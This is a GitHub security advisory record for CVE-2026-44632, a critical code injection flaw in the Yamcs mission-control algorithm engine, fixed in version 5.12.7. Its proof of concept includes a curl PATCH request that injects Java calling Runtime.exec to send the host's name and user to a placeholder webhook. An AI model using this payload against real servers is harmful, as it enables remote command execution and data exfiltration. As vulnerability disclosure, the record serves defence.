{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/177873564?v=4", "events_url": "https://api.github.com/users/superpegaso2703/events{/privacy}", "followers_url": "https://api.github.com/users/superpegaso2703/followers", "following_url": "https://api.github.com/users/superpegaso2703/following{/other_user}", "gists_url": "https://api.github.com/users/superpegaso2703/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/superpegaso2703", "id": 177873564, "login": "superpegaso2703", "node_id": "U_kgDOCpoinA", "organizations_url": "https://api.github.com/users/superpegaso2703/orgs", "received_events_url": "https://api.github.com/users/superpegaso2703/received_events", "repos_url": "https://api.github.com/users/superpegaso2703/repos", "site_admin": false, "starred_url": "https://api.github.com/users/superpegaso2703/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/superpegaso2703/subscriptions", "type": "User", "url": "https://api.github.com/users/superpegaso2703", "user_view_type": "public"}}], "cve_id": "CVE-2026-44632", "cvss": {"score": 9.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 9.1, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-94", "name": "Improper Control of Generation of Code ('Code Injection')"}], "description": "### Summary
A Server-Side Code Injection vulnerability exists in the Yamcs algorithm evaluation engine (`org.yamcs.algorithms.JavaExprAlgorithmExecutionFactory`). The application dynamically compiles and evaluates user-controlled algorithm text without enforcing a secure sandbox. An authenticated user with the `ChangeMissionDatabase` privilege can exploit this to achieve Remote Code Execution (RCE) on the underlying host operating system via the Janino compiler.

### Proof of Concept (PoC)
The vulnerability can be exploited by overriding an existing algorithm's text via the REST API and injecting a malicious Java payload that executes OS commands.

**Prerequisites:**
1. A running Yamcs instance with an active processor (e.g., `instance=myproject`, `processor=realtime`).
2. An active authentication token for a user with the `SystemPrivilege.ChangeMissionDatabase` privilege.

**Steps to Reproduce:**

1. Send an authenticated HTTP `PATCH` request to the MDB override endpoint to inject the malicious Java code into an existing algorithm (e.g., `copySunsensor`). The payload uses `java.lang.Runtime` to execute a reverse shell or ping an external webhook.

```bash
curl -i -X PATCH \
  'http://<YAMCS-SERVER-IP>:8090/api/mdb/myproject/realtime/algorithms/myproject/copySunsensor' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <YOUR_AUTH_TOKEN>' \
  -d '{
    "action": "SET",
    "algorithm": {
      "text": "try { java.lang.Runtime.getRuntime().exec(new String[]{\"bash\", \"-c\", \"curl https://<YOUR-WEBHOOK-URL>/$(hostname)_$(whoami)\"}); } catch (Exception e) {} out0.setFloatValue(1.0f);"
    }
  }'
```

2. Trigger the algorithm evaluation by sending telemetry data that the algorithm depends on (e.g., running the `simulator.py` script to generate sun sensor data).
3. The Yamcs server uses the Janino `SimpleCompiler` to compile the injected text into a Java class on the fly. Since no restrictive `ClassLoader` is applied, the payload is successfully compiled and executed.
4. Verify that the command executed successfully on the host machine by checking the incoming HTTP request on the provided webhook URL.

### Impact
This vulnerability allows a user with application-level configuration privileges to escalate their access to full System/OS control. This leads to arbitrary command execution, potential data exfiltration, and lateral movement within the network hosting the Yamcs server.

### Credits
Discovered & reported by Pablo Picurelli Ortiz (@superpegaso2703), cybersecurity student at Universidad Rey Juan Carlos.", "epss": {"percentage": 0.0094, "percentile": 0.56981}, "ghsa_id": "GHSA-524g-x36v-9wm6", "github_reviewed_at": "2026-05-27T00:05:45Z", "html_url": "https://github.com/advisories/GHSA-524g-x36v-9wm6", "identifiers": [{"type": "GHSA", "value": "GHSA-524g-x36v-9wm6"}, {"type": "CVE", "value": "CVE-2026-44632"}], "nvd_published_at": null, "published_at": "2026-05-27T00:05:45Z", "references": ["https://github.com/yamcs/yamcs/security/advisories/GHSA-524g-x36v-9wm6", "https://github.com/advisories/GHSA-524g-x36v-9wm6"], "repository_advisory_url": "https://api.github.com/repos/yamcs/yamcs/security-advisories/GHSA-524g-x36v-9wm6", "severity": "critical", "source_code_location": "https://github.com/yamcs/yamcs", "summary": "Yamcs Vulnerable to Server-Side Code Injection (RCE) via Janino Expression Engine in `JavaExprAlgorithmExecutionFactory`", "type": "reviewed", "updated_at": "2026-05-27T00:05:45Z", "url": "https://api.github.com/advisories/GHSA-524g-x36v-9wm6", "vulnerabilities": [{"first_patched_version": "5.12.7", "package": {"ecosystem": "maven", "name": "org.yamcs:yamcs-core"}, "vulnerable_functions": [], "vulnerable_version_range": "< 5.12.7"}], "withdrawn_at": null}

title: Yamcs Vulnerable to Server-Side Code Injection (RCE) via Janino Expression Engine in `JavaExprAlgorithmExecutionFactory`
